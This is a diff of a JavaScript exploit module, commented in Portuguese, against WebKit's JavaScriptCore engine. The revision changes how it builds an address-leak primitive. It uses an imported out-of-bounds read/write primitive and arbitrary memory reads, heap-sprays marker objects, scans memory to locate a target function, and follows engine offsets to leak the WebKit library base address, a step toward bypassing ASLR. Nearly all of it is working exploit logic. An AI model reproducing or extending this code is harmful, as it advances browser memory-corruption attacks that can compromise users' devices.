@@ -1,48 +1,56 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R46 - Addrof via Call Frame Walk & Scan)
+// js/script3/testArrayBufferVictimCrash.mjs (R47 - addrof via Varredura OOB & Heap Spray)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
-    arb_read, // ESSENCIAL para esta estratégia
+    arb_read,
+    getOOBDataView, // Precisamos de acesso ao oob_dataview_real
     isOOBReady,
     selfTestOOBReadWrite,
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R46_WEBKIT = "WebKit_Exploit_R46_CallFrameWalkAddrof";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R47_WEBKIT = "WebKit_Exploit_R47_OOBScanAddrof";
 
 // Parâmetros do Spray e Scan
-const SPRAY_SIZE = 10000;
-const SPRAY_MARKER_BIGINT = 0x4343434344444444n; // Novo marcador único
-const SCAN_RANGE_BYTES = 0x800000; // Aumentar o range da varredura para 8MB
-const SCAN_STEP = 0x8;
+const SPRAY_SIZE = 20000; // Aumentar o spray para maior densidade
+const SPRAY_MARKER_BIGINT = 0x4444444455555555n; // Novo marcador único
+const HEAP_SCAN_RANGE_BYTES = 0x800000; // Varredura de 8MB em torno do ponteiro encontrado
+const HEAP_SCAN_STEP = 0x8;
 
-// Offsets para Call Frame Walking (precisam ser validados nos binários)
-// Apenas TOP_CALL_FRAME_OFFSET está no config.mjs. Os outros são placeholders.
-const VM_TOP_CALL_FRAME_OFFSET = JSC_OFFSETS.VM.TOP_CALL_FRAME_OFFSET;
-const CALL_FRAME_CALLEE_OFFSET = 0x8;  // Placeholder! Precisa validar.
-const CALL_FRAME_SCOPE_OFFSET = 0x18; // Placeholder! Precisa validar.
-const JS_SCOPE_GLOBAL_OBJECT_OFFSET = 0x10; // Placeholder! Precisa validar.
+// Parâmetros da Varredura OOB inicial
+const OOB_SCAN_WINDOW_BYTES = 0x100000; // Varredura de 1MB dentro do nosso buffer OOB
 
-// Offsets para WebKit Leak (usados após o addrof)
+// Offsets para WebKit Leak
 const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
 const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
 const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);
 
-// Variável global para a primitiva addrof
-let addrof_primitive = null;
+function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
+    if (!isAdvancedInt64Object(ptr)) { return false; }
+    const high = ptr.high(); const low = ptr.low();
+    if (high === 0 && low === 0) return false;
+    // Adicionar verificação para ponteiros com high > 0x80000000 (geralmente não são ponteiros de heap válidos)
+    if (high >= 0x80000000) return false;
+    if (high === 0x7FF80000 && low === 0x0) return false;
+    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
+    if (high === 0 && low < 0x10000) return false;
+    return true;
+}
+function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
+    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
+    if (value === null || value === undefined) { return String(value); }
+    try { return toHex(value); } catch (e) { return String(value); }
+}
 
-function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
-function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R47() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R47_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Varredura OOB & Heap Spray ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init OOBScan...`;
 
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R46() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R46_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Call Frame Walk & Scan ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init CallFrameWalk...`;
-
-    logS3(`--- Fase 0 (CallFrameWalk): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+    logS3(`--- Fase 0 (OOBScan): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
     let coreOOBReadWriteOK = false;
     try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
     catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
@@ -52,57 +60,42 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R46() {
 
     let result = {
         errorOccurred: null,
-        addrof_result: { success: false, msg: "Addrof (CallFrameWalk): Não obtido.", leaked_object_addr: null },
-        webkit_leak_result: { success: false, msg: "WebKit Leak (CallFrameWalk): Não iniciado.", webkit_base_candidate: null },
+        addrof_result: { success: false, msg: "Addrof (OOBScan): Não obtido.", leaked_object_addr: null },
+        webkit_leak_result: { success: false, msg: "WebKit Leak (OOBScan): Não iniciado.", webkit_base_candidate: null },
     };
 
     try {
         await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
-        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");
+        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB para varredura.");
 
-        // --- Fase 1: Encontrar um ponteiro de heap via Call Frame Walking ---
-        logS3(`--- Fase 1 (CallFrameWalk): Encontrando um ponteiro de heap via Call Frame ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        // Precisamos de um endereço base para a VM. Isso é altamente dependente do sistema.
-        // Vamos tentar varrer uma região de memória baixa onde a VM pode residir.
-        const VM_SEARCH_START = new AdvancedInt64(0x20000000); // Endereço de início especulativo
-        const VM_SEARCH_END = new AdvancedInt64(0x30000000);   // Endereço de fim especulativo
-        let vm_base_addr = null;
+        // --- Fase 1: Encontrar um ponteiro de heap inicial via Varredura OOB ---
+        logS3(`--- Fase 1 (OOBScan): Procurando por um ponteiro de heap na janela OOB ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        const oob_view = getOOBDataView(); // Obter a DataView com OOB
+        if (!oob_view) throw new Error("getOOBDataView() não retornou uma view válida.");
 
-        logS3(`   Procurando pela VM entre ${VM_SEARCH_START.toString(true)} e ${VM_SEARCH_END.toString(true)}... (Esta parte é especulativa)`, "info");
-        // Para verificar se um endereço contém a VM, precisaríamos de um "número mágico" ou ponteiro vtable conhecido.
-        // Para este teste, vamos PULAR a busca e assumir que um endereço hipotético foi encontrado.
-        // ** NOTA: Você precisará de uma forma de encontrar o vm_base_addr real. **
-        // vm_base_addr = await findVmBaseIn(VM_SEARCH_START, VM_SEARCH_END); // Função hipotética
-        
-        // Se a busca da VM for muito difícil, outra forma de obter um ponteiro de heap é necessária.
-        // Por enquanto, vamos pular esta parte e focar na lógica PÓS-obtenção de um ponteiro.
-        // Vamos usar a técnica anterior de TC para tentar obter um ponteiro de heap, pois ela é a única que mostrou algum efeito.
-        let heap_base_ptr = null;
-        let temp_victim_ta = new Uint32Array(16); temp_victim_ta.fill(0);
-        try {
-            oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);
-            // ... (Lógica da sonda TC simplificada para apenas vazar o ponteiro)
-            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
+        let initial_heap_ptr = null;
+        logS3(`   Varrendo os primeiros ${OOB_SCAN_WINDOW_BYTES / 1024} KB da janela OOB...`, 'info');
+        for (let offset = 0; offset < OOB_SCAN_WINDOW_BYTES; offset += 4) { // Pular de 4 em 4 bytes
             try {
-                Object.defineProperty(Object.prototype, ppKey, { value: () => ({}), writable: true, configurable: true, enumerable: false });
-                polluted = true;
-                JSON.stringify(temp_victim_ta);
-                for (let i = 0; i < temp_victim_ta.length - 1; i += 2) {
-                    let p = new AdvancedInt64(temp_victim_ta[i], temp_victim_ta[i+1]);
-                    if (isValidPointer(p, "_scanBaseFinder")) { heap_base_ptr = p; break; }
+                const low = oob_view.getUint32(offset, true);
+                const high = oob_view.getUint32(offset + 4, true);
+                const potential_ptr = new AdvancedInt64(low, high);
+                if (isValidPointer(potential_ptr, "_oobScan")) {
+                    initial_heap_ptr = potential_ptr;
+                    break;
                 }
-            } finally { if (polluted) { Object.defineProperty(Object.prototype, ppKey, origDesc); } }
-        } catch(e) {}
-
-        if (!heap_base_ptr) {
-            throw new Error("Falha em todas as tentativas de obter um ponteiro de heap inicial. Impossível continuar o scan.");
+            } catch (e) { /* Ignorar erros de leitura se houver */ }
         }
-        logS3(`   Endereço base para varredura obtido (via TC leak ou outro método): ${heap_base_ptr.toString(true)}`, "good");
 
-        // --- Fase 2: Construir a primitiva ADDROF via Heap Spray & Scan ---
-        logS3(`--- Fase 2 (CallFrameWalk): Construindo ADDROF via Heap Spray & Scan ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        if (!initial_heap_ptr) {
+            throw new Error("Nenhum ponteiro de heap válido encontrado na janela OOB. Impossível continuar.");
+        }
+        logS3(`   Ponteiro de heap inicial encontrado: ${initial_heap_ptr.toString(true)}`, "good");
+
+        // --- Fase 2: Construir a primitiva ADDROF via Heap Spray & Scan com arb_read ---
+        logS3(`--- Fase 2 (OOBScan): Construindo ADDROF via Heap Spray & Scan ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         
-        const target_function_for_addrof = function someUniqueLeakFunctionR46_SprayTarget() {};
+        const target_function_for_addrof = function someUniqueLeakFunctionR47_SprayTarget() {};
         
         logS3(`   Pulverizando a memória com ${SPRAY_SIZE} objetos marcadores...`, "info");
         const spray_array = new Array(SPRAY_SIZE);
@@ -111,10 +104,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R46() {
         }
         logS3(`   Spray concluído.`, "good");
 
-        logS3(`   Iniciando varredura com arb_read em torno de ${heap_base_ptr.toString(true)}...`, "info");
+        logS3(`   Iniciando varredura com arb_read em torno de ${initial_heap_ptr.toString(true)}...`, "info");
         let found_marker_at = null;
-        for (let offset = -SCAN_RANGE_BYTES; offset <= SCAN_RANGE_BYTES; offset += SCAN_STEP) {
-            const current_scan_addr = heap_base_ptr.add(new AdvancedInt64(offset));
+        for (let offset = -HEAP_SCAN_RANGE_BYTES; offset <= HEAP_SCAN_RANGE_BYTES; offset += HEAP_SCAN_STEP) {
+            const current_scan_addr = initial_heap_ptr.add(new AdvancedInt64(offset));
             try {
                 const val64 = await arb_read(current_scan_addr, 8);
                 if (val64 && val64.toBigInt() === SPRAY_MARKER_BIGINT) {
@@ -122,11 +115,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R46() {
                     logS3(`   !!! MARCADOR ENCONTRADO EM ${found_marker_at.toString(true)} !!!`, "success_major");
                     break;
                 }
-            } catch (e) { /* ignorar erros de leitura */ }
+            } catch (e) { /* ignorar erros */ }
         }
 
         if (!found_marker_at) {
-            throw new Error("Marcador do spray não encontrado na memória. Tente aumentar SPRAY_SIZE ou SCAN_RANGE_BYTES.");
+            throw new Error("Marcador do spray não encontrado na memória. Tente aumentar SPRAY_SIZE ou HEAP_SCAN_RANGE_BYTES.");
         }
         
         const target_object_pointer_addr = found_marker_at.add(new AdvancedInt64(8));
@@ -136,10 +129,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R46() {
         }
 
         logS3(`   !!! ADDROF(target_function_for_addrof) = ${leaked_target_addr.toString(true)} !!!`, "success_major");
-        result.addrof_result = { success: true, msg: "addrof obtido via Heap Spray e arb_read.", leaked_object_addr: leaked_target_addr.toString(true) };
+        result.addrof_result = { success: true, msg: "addrof obtido via Varredura OOB e Heap Spray.", leaked_object_addr: leaked_target_addr.toString(true) };
         
         // --- Fase 3: Usar a primitiva ADDROF para vazar a base do WebKit ---
-        logS3(`--- Fase 3 (CallFrameWalk): Usando addrof para vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        logS3(`--- Fase 3 (OOBScan): Usando addrof para vazar o endereço base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         
         const addr_of_target_func = leaked_target_addr;
         const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
@@ -160,6 +153,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R46() {
         logS3(`   ERRO na execução do exploit: ${e.message}`, "critical");
         result.errorOccurred = e.message;
         document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
+    } finally {
+        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
     }
 
     return result;
